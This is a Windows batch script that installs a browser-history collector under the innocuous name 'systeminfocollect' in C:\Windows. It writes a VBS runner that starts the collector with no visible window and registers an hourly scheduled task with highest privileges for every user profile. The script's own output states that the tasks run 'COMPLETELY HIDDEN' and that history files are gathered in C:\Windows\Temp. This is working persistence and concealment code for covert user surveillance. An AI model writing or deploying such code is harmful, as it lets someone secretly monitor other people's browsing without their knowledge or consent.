@echo off
setlocal enabledelayedexpansion

echo [%date% %time%] Starting scheduled tasks deployment... > "C:\Windows\Temp\task_creation.log"

echo Deploying browser history script to C:\Windows...
echo.

REM Check if running as administrator
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [%date% %time%] ERROR: Not running as administrator >> "C:\Windows\Temp\task_creation.log"
    echo Error: This script must be run as Administrator
    echo Please right-click and "Run as administrator"
    exit /b 1
)

echo [%date% %time%] Running as administrator confirmed >> "C:\Windows\Temp\task_creation.log"

REM Check if source script exists
if not exist "systeminfocollect.bat" (
    echo [%date% %time%] ERROR: systeminfocollect.bat not found in current directory >> "C:\Windows\Temp\task_creation.log"
    echo Error: systeminfocollect.bat not found in current directory
    echo Please run this script from the directory containing systeminfocollect.bat
    exit /b 1
)

echo [%date% %time%] Source BAT script found >> "C:\Windows\Temp\task_creation.log"

REM Copy BAT script to C:\Windows
echo Copying systeminfocollect.bat to C:\Windows...
copy "systeminfocollect.bat" "C:\Windows\" >nul

if %errorlevel% equ 0 (
    echo [%date% %time%] Script copied successfully to C:\Windows >> "C:\Windows\Temp\task_creation.log"
    echo Success: Script copied to C:\Windows\systeminfocollect.bat
) else (
    echo [%date% %time%] ERROR: Failed to copy script to C:\Windows >> "C:\Windows\Temp\task_creation.log"
    echo Error: Failed to copy script to C:\Windows
    exit /b 1
)

REM Create VBS hidden runner in current directory first
echo Creating VBS hidden runner...
(
echo Set WshShell = CreateObject("WScript.Shell")
echo WshShell.Run "C:\Windows\systeminfocollect.bat", 0, False
echo Set WshShell = Nothing
) > "systeminfo.vbs"

if not exist "systeminfo.vbs" (
    echo [%date% %time%] ERROR: Failed to create VBS hidden runner locally >> "C:\Windows\Temp\task_creation.log"
    echo Error: Failed to create VBS hidden runner
    exit /b 1
)

echo [%date% %time%] VBS hidden runner created locally >> "C:\Windows\Temp\task_creation.log"

REM Copy VBS runner to C:\Windows
echo Copying systeminfo.vbs to C:\Windows...
copy "systeminfo.vbs" "C:\Windows\" >nul

if %errorlevel% equ 0 (
    echo [%date% %time%] VBS hidden runner copied successfully to C:\Windows >> "C:\Windows\Temp\task_creation.log"
    echo VBS hidden runner copied: C:\Windows\systeminfo.vbs
    
    REM Clean up local VBS file
    del "systeminfo.vbs" >nul 2>&1
) else (
    echo [%date% %time%] ERROR: Failed to copy VBS hidden runner to C:\Windows >> "C:\Windows\Temp\task_creation.log"
    echo Error: Failed to copy VBS hidden runner to C:\Windows
    exit /b 1
)

REM Verify both scripts were copied to C:\Windows
if exist "C:\Windows\systeminfocollect.bat" (
    if exist "C:\Windows\systeminfo.vbs" (
        echo [%date% %time%] Both scripts verification passed >> "C:\Windows\Temp\task_creation.log"
        echo Verification: Both scripts successfully deployed to C:\Windows
        echo.
        echo Now creating scheduled tasks...
    ) else (
        echo [%date% %time%] ERROR: VBS runner deployment verification failed >> "C:\Windows\Temp\task_creation.log"
        echo Error: VBS runner deployment failed
        exit /b 1
    )
) else (
    echo [%date% %time%] ERROR: BAT script deployment verification failed >> "C:\Windows\Temp\task_creation.log"
    echo Error: BAT script deployment failed
    exit /b 1
)

echo.
set "VBS_RUNNER=C:\Windows\systeminfo.vbs"
set "TASK_NAME=SystemInfoCollect"

echo [%date% %time%] Starting task creation for all users >> "C:\Windows\Temp\task_creation.log"

REM Get all user directories from C:\Users
echo Creating scheduled tasks for browser history collection...
echo [%date% %time%] Scanning user directories... >> "C:\Windows\Temp\task_creation.log"

for /d %%i in ("C:\Users\*") do (
    set "USERNAME=%%~nxi"
    
    REM Skip system directories
    if not "!USERNAME!"=="Public" if not "!USERNAME!"=="Default" if not "!USERNAME!"=="Default User" if not "!USERNAME!"=="All Users" if not "!USERNAME!"=="desktop.ini" (
        echo [%date% %time%] Processing user: !USERNAME! >> "C:\Windows\Temp\task_creation.log"
        echo Creating task for user: !USERNAME!
        
        REM Create task with highest privileges using VBS hidden runner
        schtasks /create /tn "!TASK_NAME!_!USERNAME!" ^
            /tr "wscript.exe \"!VBS_RUNNER!\"" ^
            /sc hourly /mo 1 ^
            /ru "!USERNAME!" ^
            /rl HIGHEST ^
            /f
        
        if !errorlevel! equ 0 (
            echo [%date% %time%] SUCCESS: Task created for user !USERNAME! >> "C:\Windows\Temp\task_creation.log"
            echo   - Task created: !TASK_NAME!_!USERNAME!
        ) else (
            echo [%date% %time%] ERROR: Failed to create task for user !USERNAME! >> "C:\Windows\Temp\task_creation.log"
            echo   - ERROR: Failed to create task for !USERNAME!
        )
    )
)

echo [%date% %time%] Task creation process completed >> "C:\Windows\Temp\task_creation.log"

REM Display final status
echo.
echo ========================================
echo Scheduled tasks deployment completed!
echo.
echo Files deployed:
echo   - Main script: C:\Windows\systeminfocollect.bat
echo   - Hidden runner: C:\Windows\systeminfo.vbs
echo.
echo Log files:
echo   - Task creation: C:\Windows\Temp\task_creation.log
echo   - Script execution: C:\Windows\Temp\browser_history_bat.log
echo   - Browser history: C:\Windows\Temp\SystemInfoCollect\*_history.json
echo.
echo Tasks will run COMPLETELY HIDDEN every 1 hour.
echo ========================================

echo [%date% %time%] Deployment script finished successfully >> "C:\Windows\Temp\task_creation.log"

endlocal
